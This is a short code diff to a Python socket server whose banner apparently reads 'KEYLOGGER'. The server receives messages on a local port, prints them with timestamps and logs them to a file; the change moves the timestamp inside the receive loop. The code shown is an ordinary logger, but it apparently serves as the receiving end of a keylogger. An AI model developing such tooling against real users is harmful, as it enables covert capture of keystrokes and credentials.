@@ -5,7 +5,7 @@ print('''\033[1;31m
 ╠╩╗║╣ ╚╦╝║ ║ ║║ ╦║ ╦║╣ ╠╦╝ 
 \033[m\033[1;34m╩ ╩╚═╝ ╩ ╩═╝╚═╝╚═╝╚═╝╚═╝╩╚═\033[m''')
 
-timenow = datetime.now()
+
 host = 'localhost'  # Ip do server
 port = 8082 # porta do server
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -23,8 +23,9 @@ if docl:
 while True:
     try:
         Menss_Rec = str(conn.recv(1024), 'utf-8')
-
+        
         if Menss_Rec:
+            timenow = datetime.now()
             print(f'[{timenow.strftime('%d/%m/%Y, %H:%M:%S')}]\033[1;31m -> \033[m{Menss_Rec}')
             with open('log.txt','a') as keys:
                 keys.write(f'\n[{timenow.strftime('%d/%m/%Y, %H:%M:%S')}] -> {Menss_Rec}')
